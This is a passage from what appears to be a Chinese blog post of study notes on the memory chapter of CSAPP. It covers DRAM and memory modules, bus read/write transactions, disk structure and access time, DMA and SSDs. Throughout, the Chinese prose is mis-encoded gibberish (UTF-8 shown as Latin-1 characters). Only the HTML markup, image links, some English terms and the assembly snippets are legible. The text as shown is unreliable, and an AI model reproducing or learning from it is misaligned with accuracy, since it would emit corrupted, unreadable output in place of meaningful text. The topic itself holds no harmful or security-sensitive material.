èŠ¯ç‰‡çš„ç»„ç»‡ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E4%BC%A0%E7%BB%9FDRAM.png"></p><p>ä¿¡æ¯é€šè¿‡å¼•è„šçš„å¤–éƒ¨è¿æ¥å™¨æµå…¥å’Œæµå‡ºèŠ¯ç‰‡ï¼Œæ¯ä¸ªå¼•è„šä¼ é€’ä¸€ä½ä¿¡å·ã€‚å¦‚ä¸Šå›¾ data å’Œ addr éƒ½æ˜¯å¼•è„šï¼š8 ä¸ª data å¼•è„šï¼Œä¼ é€ä¸€ä¸ªå­—èŠ‚åˆ°èŠ¯ç‰‡æˆ–ä»èŠ¯ç‰‡ä¼ å‡ºä¸€ä¸ªå­—èŠ‚ï¼› 2 ä¸ª addr å¼•è„šï¼Œå®ƒä»¬æºå¸¦ 2 ä½çš„è¡Œå’Œåˆ—è¶…å•å…ƒåœ°å€ã€‚</p><p>æ¯ä¸ª DRAM èŠ¯ç‰‡è¢«è¿æ¥åˆ°æŸä¸ªç§°ä¸ºå†…å­˜æ§åˆ¶å™¨ï¼ˆemory controllerï¼‰çš„ç”µè·¯ï¼Œè¿™ä¸ªç”µè·¯å¯ä»¥ä¸€æ¬¡ä¼ é€ w ä½åˆ°æ¯ä¸ª DRAM èŠ¯ç‰‡æˆ–ä¸€æ¬¡ä»æ¯ä¸ª DRAM èŠ¯ç‰‡ä¼ å‡º w ä½ã€‚ä¸ºäº†è¯»å‡ºè¶…å•å…ƒ <code>(i,j)</code>çš„å†…å®¹ï¼Œå†…å­˜æ§åˆ¶å™¨å°†è¡Œåœ°å€å‘é€åˆ° DRAMï¼Œç„¶åæ˜¯åˆ—åœ°å€jã€‚DRAM æŠŠè¶…å•å…ƒ <code>(i,j)</code> çš„å†…å®¹å‘å›ç»™æ§åˆ¶å™¨ä¸ºå“åº”ã€‚è¡Œåœ°å€ç§°ä¸º RASï¼ˆRow Access Strobeï¼Œè¡Œè®¿é—®é€‰é€šè„‰å†²ï¼‰è¯·æ±‚ã€‚åˆ—åœ°å€ i ç§°ä¸º CASï¼ˆColumn Access Strobeï¼Œåˆ—è®¿é—®é€‰é€šè„‰å†²ï¼‰è¯·æ±‚ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒRAS å’Œ CAS è¯·æ±‚å…±äº«ç›¸åŒçš„ DRAM åœ°å€å¼•è„šã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E8%AF%BB%E4%B8%80%E4%B8%AADRAM%E7%9A%84%E5%86%85%E5%AE%B9.png"></p><h4 id="å†…å­˜æ¨¡å—"><a href="#å†…å­˜æ¨¡å—" class="headerlink" title="å†…å­˜æ¨¡å—"></a>å†…å­˜æ¨¡å—</h4><p>DRAM èŠ¯ç‰‡å°è£…åœ¨å†…æ¨¡å—ï¼ˆmemory moduleï¼‰ä¸­</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%86%85%E5%AD%98%E6%A8%A1%E5%9D%97.png"></p><p>è¦å–å‡ºå†…å­˜åœ°å€ A å¤„çš„ä¸€ä¸ªå­—ï¼Œå†…å­˜æ§åˆ¶å™¨å°† A è½¬æ¢æˆä¸€ä¸ªè¶…å•å…ƒåœ°å€ <code>(i,j)</code> ï¼Œå¹¶å°†å®ƒå‘é€åˆ°å†…å­˜æ¨¡å—ï¼Œç„¶åå†…å­˜æ¨¡å—å†å°†å’Œå¹¿æ’­åˆ°æ¯ä¸ª DRAMã€‚ä½œä¸ºå“åº”ï¼Œæ¯ä¸ª DRAM è¾“å‡ºå®ƒçš„ <code>(i,j)</code> è¶…å•å…ƒçš„8 ä½å†…å®¹ã€‚æ¨¡å—ä¸­çš„ç”µè·¯æ”¶é›†è¿™äº›è¾“å‡ºï¼Œå¹¶æŠŠå®ƒä»¬åˆå¹¶æˆä¸€ä¸ª 64 ä½å­—ï¼Œå†è¿”å›ç»™å†…å­˜æ§åˆ¶å™¨ã€‚</p><h4 id="éæ˜“å¤±æ€§å­˜å‚¨å™¨"><a href="#éæ˜“å¤±æ€§å­˜å‚¨å™¨" class="headerlink" title="éæ˜“å¤±æ€§å­˜å‚¨å™¨"></a>éæ˜“å¤±æ€§å­˜å‚¨å™¨</h4><p>å¦‚æœæ–­ç”µï¼ŒDRAM å’Œ SRAM ä¼šä¸¢å¤±å®ƒä»¬çš„ä¿¡æ¯ï¼Œä»è¿™ä¸ªæ„ä¹‰ä¸Šè¯´ï¼Œå®ƒä»¬æ˜¯æ˜“å¤±çš„ï¼ˆvolatileï¼‰ã€‚è€Œéæ˜“å¤±æ€§å­˜å‚¨å™¨ï¼ˆnonvolatile memoryï¼‰å³ä½¿æ˜¯åœ¨å…³ç”µåä»ç„¶ä¿å­˜ç€å®ƒä»¬çš„ä¿¡æ¯ã€‚</p><p>å­˜å‚¨åœ¨ ROM è®¾å¤‡ä¸­çš„ç¨‹åºé€šå¸¸è¢«ç§°ä¸ºå›ºä»¶ï¼ˆfirmwareï¼‰ã€‚</p><h4 id="è®¿é—®ä¸»å­˜"><a href="#è®¿é—®ä¸»å­˜" class="headerlink" title="è®¿é—®ä¸»å­˜"></a>è®¿é—®ä¸»å­˜</h4><p>æ•°æ®æµé€šè¿‡ç§°ä¸ºæ€»çº¿ï¼ˆbusï¼‰çš„å…±äº«ç”µå­ç”µè·¯åœ¨å¤„ç†å™¨å’Œ DRAM ä¸»å­˜ä¹‹é—´ä¼ é€’ä¿¡æ¯ã€‚æ¯æ¬¡CPU å’Œä¸»å­˜ä¹‹é—´çš„æ•°æ®ä¼ é€éƒ½æ˜¯é€šè¿‡ä¸€ç³»åˆ—æ­¥éª¤æ¥å®Œæˆçš„ï¼Œè¿™äº›æ­¥éª¤ç§°ä¸ºæ€»çº¿äº‹åŠ¡ï¼ˆbus transactionï¼‰ï¼š</p><ul><li>è¯»äº‹åŠ¡ï¼ˆread transactionï¼‰ä»ä¸»å­˜ä¼ é€æ•°æ®åˆ° CPUã€‚</li><li>å†™äº‹åŠ¡ï¼ˆwrite transactionï¼‰ä» CPU ä¼ é€æ•°æ®åˆ°ä¸»å­˜</li></ul><p>æ€»çº¿æ˜¯ä¸€ç»„å¹¶è¡Œçš„å¯¼çº¿ï¼Œèƒ½æºå¸¦åœ°å€ã€æ•°æ®å’Œæ§åˆ¶ä¿¡å·ã€‚æ§åˆ¶çº¿æºå¸¦çš„ä¿¡å·ä¼šåŒæ­¥äº‹åŠ¡ï¼Œå¹¶æ ‡è¯†å‡ºå½“å‰æ­£åœ¨è¢«æ‰§è¡Œçš„äº‹åŠ¡çš„ç±»å‹ã€‚</p><p>å¦‚ä¸‹å›¾ä¾¿æ˜¯ä¸€ä¸ªè®¡ç®—æœºç³»ç»Ÿçš„é…ç½®ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E6%80%BB%E7%BA%BF%E7%BB%93%E6%9E%84.png"></p><p>ç³»ç»Ÿæ€»çº¿ï¼ˆsystem busï¼‰è¿æ¥ CPU å’Œ I&#x2F;O æ¡¥æ¥å™¨ï¼Œå†…å­˜æ€»çº¿ï¼ˆmemory busï¼‰è¿æ¥ I&#x2F;O æ¡¥æ¥å™¨å’Œä¸»å­˜ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸¤ä¸ªå®ä¾‹ï¼š</p><p>CPU æ‰§è¡Œ <code>movq A %rax</code> è¿™ä¸ªæ“ä½œæ—¶ï¼Œåœ°å€ A å­˜å‚¨çš„å†…å®¹å°†è¢«åŠ è½½åˆ°å¯„å­˜å™¨ %rax ä¸­ï¼Œæ€»çº¿æ¥å£ä¼šåœ¨æ€»çº¿ä¸Šå‘èµ·<strong>è¯»äº‹åŠ¡</strong>ï¼Œè¯»äº‹åŠ¡æœ‰ä¸‰ä¸ªæ­¥éª¤ç»„æˆï¼š</p><ul><li>é¦–å…ˆ CPU å°†åœ°å€ A æ”¾åˆ°ç³»ç»Ÿæ€»çº¿ä¸Šï¼ŒI&#x2F;O æ¡¥å°†ä¿¡å·ä¼ é€’åˆ°å†…å­˜æ€»çº¿ã€‚</li><li>æ¥ä¸‹æ¥ä¸»å­˜æ£€æµ‹åˆ°å†…å­˜æ€»çº¿ä¸Šçš„åœ°å€ä¿¡å·ï¼Œä»å†…å­˜æ€»çº¿è¯»åœ°å€ï¼Œä» DRAM ä¸­è¯»å–æ•°æ®å­—ï¼Œå¹¶å°†æ•°æ®å†™åˆ°å†…å­˜æ€»çº¿ã€‚ I&#x2F;O æ¡¥å°†å†…å­˜æ€»çº¿ä¿¡å·ç¿»è¯‘æˆç³»ç»Ÿæ€»çº¿ä¿¡å·ï¼Œæ²¿ç€æ€»çº¿ä¼ é€’ã€‚</li><li>æœ€å CPU æ£€æµ‹åˆ°æ€»çº¿ä¸Šçš„æ•°æ®å¹¶è¯»å–ï¼Œå°†å…¶å¤åˆ¶åˆ°å¯„å­˜å™¨ %rax ä¸­ã€‚</li></ul><p>å…·ä½“å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E8%AF%BB%E4%BA%8B%E5%8A%A1.png"></p><p>CPU æ‰§è¡Œ <code>movq %rax,A</code> è¿™ä¸ªæ“ä½œæ—¶ï¼Œå¯„å­˜å™¨ %rax çš„å†…å®¹è¢«å†™åˆ°åœ°å€ A ï¼ŒCPU ä¼šå‘èµ·å†™äº‹åŠ¡ã€‚åŒæ ·ï¼Œå†™äº‹åŠ¡ä¹Ÿæœ‰ä¸‰ä¸ªåŸºæœ¬æ­¥éª¤ï¼š</p><ul><li><p>é¦–å…ˆ CPU å°†åœ°å€æ”¾åœ¨å†…å­˜æ€»çº¿ä¸Šï¼Œå†…å­˜ä»æ€»çº¿è¯»å‡ºåœ°å€å¹¶ç­‰å¾…æ•°æ®åˆ°è¾¾</p></li><li><p>CPU å°† %rax ä¸­çš„æ•°æ®å­—å¤åˆ¶åˆ°ç³»ç»Ÿå†…å­˜æ€»çº¿</p></li><li><p>æœ€åä¸»å­˜ä»å†…å­˜æ€»çº¿è¯»å‡ºæ•°æ®å­—ï¼Œå¹¶å°†è¿™äº›ä½å­˜å‚¨åœ¨ DRAM ä¸­</p></li></ul><p>å…·ä½“å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%86%99%E4%BA%8B%E5%8A%A1.png"></p><h3 id="ç£ç›˜å­˜å‚¨"><a href="#ç£ç›˜å­˜å‚¨" class="headerlink" title="ç£ç›˜å­˜å‚¨"></a>ç£ç›˜å­˜å‚¨</h3><p>ç£ç›˜æ˜¯å¹¿ä¸ºåº”ç”¨çš„ä¿å­˜å¤§é‡æ•°æ®çš„å­˜å‚¨è®¾å¤‡ï¼Œå­˜å‚¨æ•°æ®çš„æ•°é‡æ¯” RAM å¤§å¾—å¤šï¼Œä½†ä»ç£ç›˜è¯»å–æ•°æ®ä¹Ÿè¦æ¯” RAM æ…¢è®¸å¤šã€‚</p><h4 id="ç£ç›˜æ„é€ "><a href="#ç£ç›˜æ„é€ " class="headerlink" title="ç£ç›˜æ„é€ "></a>ç£ç›˜æ„é€ </h4><p>ç£ç›˜é©±åŠ¨å™¨ï¼ˆdisk driveï¼‰ï¼Œç®€ç§°ç£ç›˜ã€‚ä¸€ä¸ªç£ç›˜æ˜¯ç”±å¤šä¸ª<strong>ç›˜ç‰‡</strong>æ„æˆçš„ï¼Œå°è£…åœ¨ä¸€ä¸ªå¯†å°çš„å®¹å™¨é‡Œã€‚æ¯ä¸ªç›˜ç‰‡æœ‰ä¸¤é¢ï¼ˆæˆ–è€…ç§°ä¸ºè¡¨é¢ï¼‰è¦†ç›–ç€ç£æ€§è®°å¿†ææ–™ã€‚è½¬ç›˜ä¸­é—´æœ‰ä¸€ä¸ªå¯ä»¥é€‰è£…çš„ä¸»è½´ï¼Œä½¿å¾—ç›˜ç‰‡ä»¥å›ºå®šçš„æ—‹è½¬é€Ÿç‡æ—‹è½¬ã€‚</p><p>æ¯ä¸ªç›˜ç‰‡åŒ…å«å¤šä¸ªåŒå¿ƒåœ†ç»„æˆçš„ç£é“ï¼Œæ¯ä¸ªç£é“ä¼šè¢«åˆ’åˆ†ä¸ºä¸€ç»„æ‰‡åŒºï¼Œæ¯ä¸ªæ‰‡åŒºåŒ…å«ç›¸ç­‰æ•°é‡çš„æ•°æ®ä½ï¼ˆé€šå¸¸æ˜¯512å­—èŠ‚ï¼‰ã€‚æ‰‡åŒºä¹‹é—´ç”±ä¸€äº›é—´éš™ï¼ˆgapï¼‰åˆ†éš”å¼€,è¿™äº›é—´éš™ä¸­ä¸å­˜å‚¨æ•°æ®ä½ã€‚é—´éš™å­˜å‚¨ç”¨æ¥æ ‡è¯†æ‰‡åŒºçš„æ ¼å¼åŒ–ä½ã€‚</p><p><strong>æŸ±é¢</strong>æ˜¯æŒ‡æ¯ä¸ªç›˜çš„åŒä¸€ç£é“çš„é›†åˆï¼Œæ¯”å¦‚æ¯ä¸ªç›˜çš„ç¬¬ä¸€ä¸ªåŒå¿ƒåœ†ç»„æˆäº†ç¬¬ä¸€ä¸ªæŸ±é¢ã€‚</p><h4 id="ç£ç›˜å®¹é‡"><a href="#ç£ç›˜å®¹é‡" class="headerlink" title="ç£ç›˜å®¹é‡"></a>ç£ç›˜å®¹é‡</h4><p>ç£ç›˜ä¸Šå¯è®°å½•çš„æœ€å¤§ä½æ•°æˆä¸ºå®ƒçš„æœ€å¤§å®¹é‡ï¼Œæˆ–è€…ç®€ç§°å®¹é‡ã€‚ç£ç›˜å®¹é‡ç”±ä»¥ä¸‹æŠ€æœ¯å› ç´ å†³å®šï¼š</p><ul><li>è®°å½•å¯†åº¦ï¼ˆrecoding densityï¼‰ï¼ˆä½&#x2F;è‹±å¯¸ï¼‰ï¼šç£é“ä¸€è‹±å¯¸çš„æ®µä¸­å¯ä»¥æ”¾å…¥çš„ä½æ•°ã€‚</li><li>ç£é“å¯†åº¦ï¼ˆtrackdensityï¼‰ï¼ˆé“&#x2F;è‹±å¯¸ï¼‰ï¼šä»ç›˜ç‰‡ä¸­å¿ƒå‡ºå‘åŠå¾„ä¸Šä¸€è‹±å¯¸çš„æ®µå†…å¯ä»¥æœ‰çš„ç£é“æ•°ç›®</li><li>é¢å¯†åº¦ï¼ˆareal densityï¼‰ï¼ˆä½&#x2F;å¹³æ–¹è‹±å¯¸ï¼‰ï¼šè®°å½•å¯†åº¦ä¸ç£é“å¯†åº¦çš„ä¹˜æœº</li></ul><p>æˆ‘ä»¬è®¡ç®—é¢å¯†åº¦åªè¦æ ¹æ®ä¸‹é¢çš„å…¬å¼å³å¯ï¼š<br>$$<br>ç£ç›˜å®¹é‡&#x3D;\frac{å­—èŠ‚æ•°}{æ‰‡åŒº}\times\frac{å¹³å‡æ‰‡åŒºæ•°}{ç£é“}\times\frac{ç£é“æ•°}{è¡¨é¢}\times\frac{è¡¨é¢æ•°}{ç›˜ç‰‡}\times\frac{ç›˜ç‰‡æ•°}{ç£ç›˜}<br>$$</p><h4 id="ç£ç›˜æ“ä½œ"><a href="#ç£ç›˜æ“ä½œ" class="headerlink" title="ç£ç›˜æ“ä½œ"></a>ç£ç›˜æ“ä½œ</h4><p>ç£ç›˜ç”¨è¯»&#x2F;å†™å¤´ï¼ˆread&#x2F;write headï¼‰æ¥è¯»å†™å­˜å‚¨åœ¨ä¹ æ€§è¡¨é¢çš„ä½ï¼Œè€Œè¯»å†™å¤´è¿æ¥åˆ°ä¸€ä¸ªä¼ åŠ¨è‡‚çš„ä¸€ç«¯ã€‚æ¯ä¸ªç›˜é¢éƒ½æœ‰ä¸€ä¸ªç‹¬ç«‹çš„è¯»&#x2F;å†™å¤´ã€‚è¯»&#x2F;å†™å¤´å‚ç›´æ’åˆ—ï¼Œä¸€è‡´è¡ŒåŠ¨ã€‚åœ¨ä»»ä½•æ—¶åˆ»ï¼Œæ‰€æœ‰çš„è¯»&#x2F;å†™å¤´éƒ½ä½äºåŒä¸€ä¸ªæŸ±é¢ä¸Šã€‚</p><p>é€šè¿‡æ²¿ç€åŠå¾„è½´å‰åç§»åŠ¨è¿™ä¸ªä¼ åŠ¨è‡‚ï¼Œé©±åŠ¨å™¨å¯ä»¥å°†è¯»&#x2F;å†™å¤´å®šä½åœ¨ç›˜é¢ä¸Šçš„ä»»ä½•ç£é“ä¸Šã€‚è¿™æ ·çš„æœºæ¢°è¿åŠ¨ç§°ä¸º<strong>å¯»é“ï¼ˆseekï¼‰</strong>ã€‚</p><p>å¦‚ä¸‹å›¾ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%A3%81%E7%9B%98%E7%9A%84%E5%8A%A8%E6%80%81%E7%89%B9%E6%80%A7.png"></p><p>è¯»å†™å¤´åœ¨ç£ç›˜è¡¨é¢å¤§çº¦ 0.1 å¾®ç±³å¤„é£ç¿”<del>ï¼ˆè¿™åº”è¯¥æ˜¯ç›´è¯‘æ¥çš„å­ä¸è¿‡ä¹Ÿæ˜¯ç”ŸåŠ¨å½¢è±¡å—·ï¼‰</del>ï¼Œæ‰€ä»¥ç›˜é¢ä¸Šå¾®å°çš„ç°å°˜ä¹Ÿä¼šå½±å“è¯»å†™æ“ä½œï¼Œå¦‚æœè¯»å†™å¤´é‡åˆ°äº†ç°å°˜è¿™ç±»éšœç¢ç‰©å°±ä¼šåœä¸‹æ¥ï¼Œæ’åˆ°ç›˜é¢ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„<strong>è¯»&#x2F;å†™å¤´å†²æ’</strong>ã€‚å› æ­¤ç£ç›˜æ€»æ˜¯å¯†å°çš„ã€‚</p><p>ç£ç›˜ä»¥æ‰‡åŒºå¤§å°çš„å—æ¥è¯»å†™æ•°æ®ã€‚å¯¹æ‰‡åŒºçš„è®¿é—®æ—¶é—´ï¼ˆaccess timeï¼‰æœ‰ä¸‰ä¸ªä¸»è¦çš„éƒ¨åˆ†ï¼š</p><ul><li>å¯»é“æ—¶é—´ï¼ˆseek timeï¼‰ï¼šä¸ºäº†è¯»å–æŸä¸ªç›®æ ‡æ‰‡åŒºçš„å†…å®¹ï¼Œä¼ åŠ¨é¦–å…ˆå°†è¯»&#x2F;å†™å¤´å®šä½åˆ°åŒ…å«ç›®æ ‡æ‰‡åŒºçš„ç£é“ä¸Šã€‚ç§»åŠ¨ä¼ åŠ¨è‡‚æ‰€éœ€çš„æ—¶é—´ç§°ä¸ºå¯»é“æ—¶é—´ã€‚</li><li>æ—‹è½¬æ—¶é—´ï¼ˆrotational latencyï¼‰ï¼šä¸€æ—¦è¯»&#x2F;å†™å¤´å®šä½åˆ°äº†æœŸæœ›çš„ç£é“ï¼Œé©±åŠ¨å™¨ç­‰å¾…ç›®æ ‡æ‰‡åŒºçš„ç¬¬ä¸€ä¸ªä½æ—‹è½¬åˆ°è¯»&#x2F;å†™å¤´ä¸‹ã€‚è¿™ä¸ªæ­¥éª¤çš„æ€§èƒ½ä¾èµ–äºå½“è¯»&#x2F;å†™å¤´åˆ°è¾¾ç›®æ ‡æ‰‡åŒºæ—¶ç›˜é¢çš„ä½ç½®ä»¥åŠç£ç›˜çš„æ—‹è½¬é€Ÿåº¦ã€‚</li><li>ä¼ é€æ—¶é—´ï¼ˆtransfer timeï¼‰ï¼šä¸€ä¸ªæ‰‡åŒºçš„ä¼ é€æ—¶é—´ä¾èµ–äºæ—‹è½¬é€Ÿåº¦å’Œæ¯æ¡ç£é“çš„æ‰‡åŒºæ•°ç›®ã€‚</li></ul><h4 id="é€»è¾‘ç£ç›˜å—"><a href="#é€»è¾‘ç£ç›˜å—" class="headerlink" title="é€»è¾‘ç£ç›˜å—"></a>é€»è¾‘ç£ç›˜å—</h4><p>æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ç£ç›˜æ¯”è¾ƒå¤æ‚ï¼Œä¸ºäº†ä¾¿äºæ“ä½œç³»ç»Ÿè¯»å–ç£ç›˜æ•°æ®ï¼Œç°ä»£ç£ç›˜ä¸ºæˆ‘ä»¬æ„é€ äº†ä¸€ä¸ªç®€å•çš„è§†å›¾ï¼Œæ˜¯ä¸€ä¸ª B ä¸ªæ‰‡åŒºå¤§å°çš„é€»è¾‘å—åºåˆ—ï¼Œç£ç›˜å°è£…ä¸­æœ‰ä¸€ä¸ªè®¾å¤‡å«<strong>ç£ç›˜æ§åˆ¶å™¨</strong>ç»´æŠ¤äº†é€»è¾‘å—å·ï¼ˆå¯¹æ“ä½œç³»ç»Ÿçš„æŠ½è±¡ï¼‰å’Œç£ç›˜æ‰‡åŒºï¼ˆç‰©ç†æ‰‡åŒºï¼‰ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚</p><p>æ“ä½œç³»ç»Ÿæƒ³è¦æ‰§è¡Œ IO æ“ä½œè¯»å†™æ–‡ä»¶çš„æ—¶å€™ï¼Œå°±ä¼šå‘é€ä¸€ä¸ªé€»è¾‘å—å·ç»™<strong>ç£ç›˜æ§åˆ¶å™¨</strong>ç¿»è¯‘æˆä¸€ä¸ªä¸‰å…ƒç»„ï¼ˆç›˜é¢ï¼Œç£é“ï¼Œæ‰‡åŒºï¼‰æ‰¾åˆ°å¯¹åº”çš„å€¼è¿›è¡Œè¯»å†™ã€‚</p><h4 id="è¿æ¥-I-x2F-O-è®¾å¤‡"><a href="#è¿æ¥-I-x2F-O-è®¾å¤‡" class="headerlink" title="è¿æ¥ I&#x2F;O è®¾å¤‡"></a>è¿æ¥ I&#x2F;O è®¾å¤‡</h4><p>è¾“äºº&#x2F;è¾“å‡ºï¼ˆI&#x2F;Oï¼‰è®¾å¤‡ï¼Œéƒ½æ˜¯é€šè¿‡ I&#x2F;O æ€»çº¿è¿æ¥åˆ°CPUå’Œä¸»å­˜çš„ã€‚</p><p>æœ‰ä»¥ä¸‹é›†ä¸­è®¾å¤‡å¯ä»¥è¿æ¥åˆ°æ€»çº¿ï¼š</p><ul><li>é€šç”¨ä¸²è¡Œæ€»çº¿ï¼ˆUniversal Serial Busï¼ŒUSBï¼‰æ§åˆ¶å™¨æ˜¯ä¸€ä¸ªè¿æ¥åˆ°USBæ€»çº¿çš„è®¾å¤‡çš„ä¸­è½¬æœºæ„ï¼ŒUSB æ€»çº¿æ˜¯ä¸€ä¸ªå¹¿æ³›ä½¿ç”¨çš„æ ‡å‡†ã€‚</li><li>å›¾å½¢å¡ï¼ˆæˆ–é€‚é…å™¨ï¼‰åŒ…å«ç¡¬ä»¶å’Œè½¯ä»¶é€»è¾‘ï¼Œå®ƒä»¬è´Ÿè´£ä»£è¡¨CPUåœ¨æ˜¾ç¤ºå™¨ä¸Šç”»åƒç´ ã€‚</li><li>ä¸»æœºæ€»çº¿é€‚é…å™¨è¿æ¥ç£ç›˜ã€‚</li><li>å…¶ä»–çš„è®¾å¤‡ï¼Œä¾‹å¦‚ç½‘ç»œé€‚é…å™¨ï¼Œå¯ä»¥é€šè¿‡å°†é€‚é…å™¨æ’å…¥åˆ°ä¸»æ¿ä¸Šç©ºçš„æ‰©å±•æ§½ä¸­ï¼Œä»è€Œè¿æ¥åˆ° I&#x2F;O æ€»çº¿ï¼Œè¿™äº›æ’æ§½æä¾›äº†åˆ°æ€»çº¿çš„ç›´æ¥ç”µè·¯è¿æ¥ã€‚</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-IO%E8%AE%BE%E5%A4%87.png"></p><h4 id="è®¿é—®ç£ç›˜"><a href="#è®¿é—®ç£ç›˜" class="headerlink" title="è®¿é—®ç£ç›˜"></a>è®¿é—®ç£ç›˜</h4><p>CPU ä½¿ç”¨ä¸€ç§ç§°ä¸ºå†…å­˜æ˜ I&#x2F;Oï¼ˆmemory-mapped I&#x2F;Oï¼‰çš„æŠ€æœ¯æ¥å‘I&#x2F;Oè®¾å¤‡å‘å°„å‘½ä»¤ã€‚åœ¨ä½¿ç”¨å†…å­˜æ˜ å°„ I&#x2F;O çš„ç³»ç»Ÿä¸­ï¼Œåœ°å€ç©ºé—´ä¸­æœ‰ä¸€å—åœ°å€æ˜¯ä¸ºä¸ I&#x2F;O è®¾å¤‡é€šä¿¡ä¿ç•™çš„ï¼Œè¿™æ ·çš„åœ°å€ç§°ä¸ºä¸€ä¸ª I&#x2F;O ç«¯å£ã€‚</p><p>å½“ä¸€ä¸ªè®¾å¤‡è¿æ¥åˆ°æ€»çº¿æ—¶ï¼Œå®ƒä¸ä¸ªæˆ–å¤šä¸ªç«¯å£ç›¸å…³è”ï¼ˆæˆ–å®ƒè¢«æ˜ å°„åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªç«¯å£ï¼‰ã€‚</p><p> <img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E8%AE%BF%E9%97%AE%E7%A3%81%E7%9B%98.png"></p><p>ä¸€èˆ¬å‘å‡ºè¯·æ±‚ä¹‹åï¼ŒCPUå°±ä¼šå»åšå…¶ä»–çš„å·¥ä½œï¼Œå› ä¸ºè¯»å–ç£ç›˜ç›¸å¯¹äºæ‰§è¡ŒæŒ‡ä»¤æ¥è¯´æ˜¯æ…¢äº†å¥½å‡ ä¸ªæ•°é‡çº§çš„ã€‚</p><p>åœ¨ç£ç›˜æ§åˆ¶å™¨æ”¶åˆ°æŒ‡ä»¤ä¹‹åï¼Œå°†é€»è¾‘å—ä¿¡å·ç¿»è¯‘æˆæ‰‡åŒºåœ°å€ï¼Œè¯»è¯¥æ‰‡åŒºçš„å†…å®¹ï¼Œç„¶åå°†è¿™äº›å†…å®¹ç›´æ¥ä¼ é€åˆ°ä¸»å­˜ï¼Œä¸éœ€è¦ CPU æ¥å¹²æ¶‰ã€‚è¿™ç§è®¾å¤‡å¯ä»¥è‡ªå·±æ‰§è¡Œè¯»å†™è€Œä¸éœ€è¦ CPU çš„å¹²æ¶‰çš„è¿‡ç¨‹ç§°ä¸º<strong>ç›´æ¥å†…å­˜è®¿é—®ï¼ˆDirect Memory Accessï¼ŒDMAï¼‰</strong></p><p>ä¼ é€å®Œæˆä¹‹åï¼Œç£ç›˜æ§åˆ¶å™¨ä¼šç»™ CPU å‘ä¸€ä¸ªä¸­æ–­ä¿¡å·æ¥é€šçŸ¥ CPU å·²ç»å®Œæˆäº†æ•°æ®ä¼ é€çš„æ“ä½œã€‚åŸºæœ¬æ€æƒ³å°±æ˜¯é€šè¿‡å‘é€ä¿¡å·ç»™ CPU èŠ¯ç‰‡çš„å¤–éƒ¨å¼•è„šï¼Œè®© CPU æš‚åœæ‰§è¡Œçš„å·¥ä½œï¼Œè·³è½¬åˆ°ä¸€ä¸ªæ“ä½œç³»ç»Ÿçš„ä¾‹ç¨‹ï¼Œæ‰§è¡Œå®Œä¸€äº›æ“¦åšä¹‹åå›åˆ°è¢«ä¸­æ–­çš„åœ°æ–¹ã€‚</p><h4 id="å›ºæ€ç¡¬ç›˜"><a href="#å›ºæ€ç¡¬ç›˜" class="headerlink" title="å›ºæ€ç¡¬ç›˜"></a>å›ºæ€ç¡¬ç›˜</h4><p>å›ºæ€ç¡¬ç›˜ï¼ˆSolid Stack Diskï¼ŒSSDï¼‰æ˜¯ä¸€ç§åŸºäºé—ªå­˜çš„å­˜å‚¨æŠ€æœ¯ã€‚</p><p>ä¸€ä¸ª SSD å°è£…ç”±ä¸€ä¸ªæˆ–è€…å¤šä¸ªé—ªå­˜èŠ¯ç‰‡å’Œé—ªå­˜ç¿»è¯‘å±‚ç»„æˆï¼Œé—ªå­˜èŠ¯ç‰‡æ›¿ä»£ä¼ ç»Ÿæ—‹è½¬ç£ç›˜ä¸­çš„æœºæ¢°é©±åŠ¨å™¨ï¼Œè€Œé—ªå­˜ç¿»è¯‘å±‚æ˜¯ä¸€ä¸ªç¡¬ä»¶&#x2F;å›ºä»¶è®¾å¤‡ï¼Œæ‰®æ¼”ä¸ç£ç›˜æ§åˆ¶å™¨ç›¸åŒçš„è§’è‰²ï¼Œå°†å¯¹é€»è¾‘å—çš„è¯ºæ±‚ç¿»è¯‘æˆå¯¹åº•å±‚ç‰©ç†è®¾å¤‡çš„è®¿é—®ã€‚</p><p>SSD çš„è¯»æ¯”å†™è¦å¿«å¾—å¤šï¼Œæ€§èƒ½å·®åˆ«æ˜¯æœ‰åº•å±‚çš„é—ªå­˜åŸºæœ¬å±æ€§æ¥å†³å®šçš„ã€‚ä¸€ä¸ªé—ªå­˜ç”± B 